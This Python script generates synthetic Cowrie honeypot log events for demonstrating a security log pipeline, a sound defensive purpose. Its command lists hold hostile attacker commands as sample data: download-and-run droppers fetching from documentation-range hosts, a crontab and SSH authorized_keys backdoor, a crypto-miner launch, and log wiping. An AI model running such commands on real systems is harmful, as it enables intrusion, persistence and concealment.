#!/usr/bin/env python3
"""
simulate_attacks.py - writes realistic *Cowrie-format* JSON events so the whole pipeline
(Filebeat -> Logstash -> Elasticsearch -> Kibana -> reports) can be demonstrated immediately,
without waiting for real attackers.

SAFETY / HONESTY
  * Output goes to simulated.json (never cowrie.json). Logstash tags every such event
    `simulated`, never sends them to AbuseIPDB/OTX/VirusTotal, and labels any enrichment
    "demo-synthetic".
  * Source IPs are random hosts inside address space typical of each world region. They
    do NOT represent real attackers; they only exist so GeoIP/ASN lookups have something
    to resolve.  Malware URLs use RFC 5737 documentation addresses; hashes are made up.

Usage
  python simulate_attacks.py --events 3000 --hours 24            # batch over the last 24 h
  python simulate_attacks.py --live --rate 5                     # keep emitting ~5 events/sec
  python simulate_attacks.py --out ./sim.json --seed 7           # deterministic output
"""
import argparse
import hashlib
import ipaddress
import json
import os
import random
import sys
import time
from datetime import datetime, timedelta, timezone

REGIONS = {  # region -> (weight, first octets typical of that registry region)
    "asia_pacific": (0.35, [1, 14, 27, 36, 39, 42, 49, 58, 59, 60, 61, 101, 103, 106, 110, 111, 112, 113, 114, 115,
                            116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 175, 180, 182, 183, 202, 210, 211,
                            218, 219, 220, 221, 222]),
    "europe": (0.25, [2, 5, 31, 37, 46, 62, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93,
                      94, 95, 109, 141, 145, 151, 176, 178, 185, 188, 193, 194, 195, 212, 213, 217]),
    "north_america": (0.15, [12, 23, 24, 50, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 96, 97, 98,
                             99, 104, 107, 108, 162, 166]),
    "latin_america": (0.15, [177, 179, 181, 186, 187, 189, 190, 191, 200, 201]),
    "africa_mideast": (0.10, [41, 102, 105, 154, 155, 196, 197]),
}

CREDS = [("root", "root"), ("root", "123456"), ("root", "password"), ("admin", "admin"), ("admin", "1234"),
         ("ubuntu", "ubuntu"), ("pi", "raspberry"), ("user", "user"), ("test", "test"), ("oracle", "oracle"),
         ("postgres", "postgres"), ("root", "admin"), ("root", "toor"), ("guest", "guest"), ("support", "support"),
         ("ftpuser", "ftpuser"), ("git", "git"), ("hadoop", "hadoop"), ("root", "12345"), ("admin", "password"),
         ("root", "qwerty"), ("default", "default"), ("ubnt", "ubnt"), ("vagrant", "vagrant"), ("deploy", "deploy")]

CLIENTS = [  # (client banner, label used to derive a stable, made-up HASSH-like fingerprint)
    ("SSH-2.0-libssh_0.9.6", "libssh-0.9"), ("SSH-2.0-Go", "golang-ssh"), ("SSH-2.0-paramiko_3.4.0", "paramiko"),
    ("SSH-2.0-PuTTY_Release_0.70", "putty"), ("SSH-2.0-OpenSSH_8.9p1", "openssh-8.9"),
    ("SSH-2.0-JSCH-0.1.54", "jsch"), ("SSH-2.0-AsyncSSH_2.14", "asyncssh"),
]

RECON = ["uname -a", "whoami", "id", "cat /proc/cpuinfo | grep name | wc -l", "free -m", "lscpu", "ls -la /tmp",
         "cat /etc/passwd", "w", "ps aux", "ifconfig", "df -h", "uname -s -v -n -r -m", "nproc"]
PERSIST = ["cd /tmp; chmod +x bins.sh; sh bins.sh", "crontab -l",
           "echo '* * * * * /tmp/.x/update' | crontab -", "mkdir -p ~/.ssh; echo 'ssh-rsa AAAAB3Nza...fake attacker@box' >> ~/.ssh/authorized_keys",
           "rm -rf /var/log/wtmp", "history -c"]
MINER = ["cd /tmp; wget http://198.51.100.{n}/xmrig -O .x; chmod +x .x", "nohup ./.x -o stratum+tcp://pool.example.invalid:3333 -u 4FAKEWALLET &",
         "pkill -f minerd"]
DROPPER = ["cd /tmp; wget http://198.51.100.{n}/{bin} -O b; chmod 777 b; ./b",
           "cd /tmp || cd /var/run; curl -O http://198.51.100.{n}/{bin}; chmod +x {bin}; ./{bin} ssh.{n}",
           "tftp -g -r {bin} 203.0.113.{n}; chmod +x {bin}; ./{bin}"]
BINS = ["x86_64", "arm7", "mips", "bins.sh", "update.sh"]
SENSOR = os.environ.get("COWRIE_HOSTNAME", "srv-db-04")
DST_IP = "172.18.0.2"


def fake_hash(label, n=0):
    return hashlib.sha256(f"simulated-malware::{label}::{n}".encode()).hexdigest()


def fake_hassh(label):
    return hashlib.md5(f"simulated-hassh::{label}".encode()).hexdigest()


def random_public_ip(rng):
    names = list(REGIONS)
    region = rng.choices(names, weights=[REGIONS[n][0] for n in names])[0]
    while True:
        ip = ipaddress.ip_address(f"{rng.choice(REGIONS[region][1])}.{rng.randint(0, 255)}.{rng.randint(0, 255)}.{rng.randint(1, 254)}")
        if ip.is_global:
            return str(ip)


class Attacker:
    PERSONAS = ["scanner", "bruteforcer", "dropper", "miner", "recon", "proxy"]
    WEIGHTS = [0.30, 0.30, 0.12, 0.08, 0.12, 0.08]

    def __init__(self, rng):
        self.ip = random_public_ip(rng)
        self.persona = rng.choices(self.PERSONAS, weights=self.WEIGHTS)[0]
        self.client = rng.choice(CLIENTS)
        self.telnet = rng.random() < 0.25
        self.n = rng.randint(2, 250)
        self.sessions = max(1, int(rng.paretovariate(1.3)))   # heavy-tailed: a few noisy repeat attackers


def iso(ts):
    return ts.strftime("%Y-%m-%dT%H:%M:%S.") + f"{ts.microsecond:06d}Z"


def session_events(rng, att, start):
    """Return the list of Cowrie events for one attacker session starting at `start`."""
    sid = "%012x" % rng.getrandbits(48)
    sport = rng.randint(1025, 65535)
    proto = "telnet" if att.telnet else "ssh"
    dport = 2223 if att.telnet else 2222
    base = {"src_ip": att.ip, "src_port": sport, "dst_ip": DST_IP, "dst_port": dport, "session": sid,
            "sensor": SENSOR}
    t = [start]

    def ev(eventid, message, gap=0.4, **extra):
        t[0] = t[0] + timedelta(seconds=rng.uniform(gap * 0.3, gap * 1.7))
        d = {"eventid": eventid, "message": message, "timestamp": iso(t[0]), **base, **extra}
        return d

    out = [{"eventid": "cowrie.session.connect", "src_ip": att.ip, "src_port": sport, "dst_ip": DST_IP,
            "dst_port": dport, "session": sid, "protocol": proto, "sensor": SENSOR, "timestamp": iso(start),
            "message": f"New connection: {att.ip}:{sport} ({DST_IP}:{dport}) [session: {sid}]"}]
    if not att.telnet:
        out.append(ev("cowrie.client.version", f"Remote SSH version: {att.client[0]}", version=att.client[0]))
        out.append(ev("cowrie.client.kex", f"SSH client hassh fingerprint: {fake_hassh(att.client[1])}",
                      hassh=fake_hassh(att.client[1]), hasshAlgorithms="curve25519-sha256;aes128-ctr;hmac-sha2-256;none"))

    def login(success):
        u, p = rng.choice(CREDS)
        if success:
            out.append(ev("cowrie.login.success", f"login attempt [{u}/{p}] succeeded", gap=0.8, username=u, password=p))
        else:
            out.append(ev("cowrie.login.failed", f"login attempt [{u}/{p}] failed", gap=0.8, username=u, password=p))

    def commands(cmds):
        for c in cmds:
            out.append(ev("cowrie.command.input", f"CMD: {c}", gap=1.5, input=c))

    if att.persona == "scanner":
        pass
    elif att.persona == "bruteforcer":
        for _ in range(rng.randint(3, 14)):
            login(False)
        if rng.random() < 0.25:
            login(True)
            commands(rng.sample(RECON, rng.randint(1, 3)))
    elif att.persona == "recon":
        for _ in range(rng.randint(0, 3)):
            login(False)
        login(True)
        commands(rng.sample(RECON, rng.randint(3, 7)))
    elif att.persona == "dropper":
        for _ in range(rng.randint(1, 4)):
            login(False)
        login(True)
        commands(rng.sample(RECON, 2))
        b = rng.choice(BINS)
        c = rng.choice(DROPPER).format(n=att.n % 254 + 1, bin=b)
        commands([c])
        url = f"http://198.51.100.{att.n % 254 + 1}/{b}"
        sha = fake_hash("dropper-" + b, att.n % 3)
        out.append(ev("cowrie.session.file_download", f"Downloaded URL ({url}) with SHA-256 {sha} to var/lib/cowrie/downloads/{sha}",
                      gap=2.0, url=url, outfile=f"var/lib/cowrie/downloads/{sha}", shasum=sha, destfile="b"))
        commands(rng.sample(PERSIST, 2))
    elif att.persona == "miner":
        login(True)
        commands(rng.sample(RECON, 2))
        commands([MINER[0].format(n=att.n % 254 + 1)])
        url = f"http://198.51.100.{att.n % 254 + 1}/xmrig"
        sha = fake_hash("xmrig", att.n % 2)
        out.append(ev("cowrie.session.file_download", f"Downloaded URL ({url}) with SHA-256 {sha} to var/lib/cowrie/downloads/{sha}",
                      gap=2.0, url=url, outfile=f"var/lib/cowrie/downloads/{sha}", shasum=sha, destfile=".x"))
        commands(MINER[1:])
    elif att.persona == "proxy" and not att.telnet:
        login(True)
        for _ in range(rng.randint(1, 4)):
            out.append(ev("cowrie.direct-tcpip.request", "direct-tcpip request to example.invalid:25", gap=1.0,
                          dst_ip="203.0.113.25", dst_port=25))
    dur = (t[0] - start).total_seconds() + rng.uniform(0.5, 6)
    t[0] = t[0] + timedelta(seconds=dur - (t[0] - start).total_seconds())
    out.append(ev("cowrie.session.closed", f"Connection lost after {dur:.1f} seconds", gap=0.01, duration=round(dur, 1)))
    # protocol only exists on the connect event in real Cowrie; keep that behaviour
    return out


def generate(rng, target_events, hours, now):
    attackers = []
    events = []
    window = hours * 3600
    while len(events) < target_events:
        att = Attacker(rng)
        attackers.append(att)
        for _ in range(att.sessions):
            # sessions cluster in bursts (attack campaigns) rather than uniform noise
            burst = rng.random() < 0.6
            offset = rng.gauss(window * rng.choice([0.25, 0.55, 0.85]), window * 0.06) if burst else rng.uniform(0, window)
            start = now - timedelta(seconds=max(5, min(window - 5, offset)))
            events.extend(session_events(rng, att, start))
            if len(events) >= target_events:
                break
    events.sort(key=lambda e: e["timestamp"])
    return events, attackers


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--events", type=int, default=3000, help="approximate number of events (batch mode)")
    ap.add_argument("--hours", type=float, default=24, help="spread events over the last N hours")
    ap.add_argument("--seed", type=int, default=None, help="random seed for reproducible output")
    ap.add_argument("--out", default="/cowrie-logs/simulated.json", help="output file (NDJSON, appended)")
    ap.add_argument("--live", action="store_true", help="keep emitting events in real time (Ctrl+C to stop)")
    ap.add_argument("--rate", type=float, default=3.0, help="approx events/second in --live mode")
    args = ap.parse_args()

    rng = random.Random(args.seed)
    os.makedirs(os.path.dirname(os.path.abspath(args.out)), exist_ok=True)

    if not args.live:
        events, attackers = generate(rng, args.events, args.hours, datetime.now(timezone.utc))
        with open(args.out, "a", encoding="utf-8", newline="\n") as fh:
            for e in events:
                fh.write(json.dumps(e, separators=(",", ":")) + "\n")
        print(f"wrote {len(events)} simulated events from {len(attackers)} synthetic attackers to {args.out}")
        return

    print(f"live mode: ~{args.rate} events/s -> {args.out} (Ctrl+C to stop)")
    try:
        with open(args.out, "a", encoding="utf-8", newline="\n", buffering=1) as fh:
            while True:
                att = Attacker(rng)
                for e in session_events(rng, att, datetime.now(timezone.utc)):
                    fh.write(json.dumps(e, separators=(",", ":")) + "\n")
                    time.sleep(rng.expovariate(args.rate))
    except KeyboardInterrupt:
        print("stopped")


if __name__ == "__main__":
    sys.exit(main())
